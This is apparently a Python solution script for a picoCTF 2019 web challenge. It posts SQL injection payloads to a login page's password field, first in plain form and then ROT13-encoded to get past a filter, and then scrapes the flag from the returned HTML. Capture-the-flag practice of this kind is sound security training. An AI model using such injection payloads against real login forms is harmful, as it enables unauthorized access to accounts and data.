from requests import *
from bs4 import BeautifulSoup

url = 'http://2019shell1.picoctf.com:32237/login.php'
data = {
    'password' : "admin' or 1=1 /*",
    'debug' : '1'
}

r = post(url , data=data)
print(r.text)

data = {
    'password' : "nqzva' be 1=1 /*",
    'debug' : '1'
}

r = post(url , data=data)
print(r.text)

soup = BeautifulSoup(r.text , 'html.parser')
flag = soup.find('p').get_text()
print(flag)
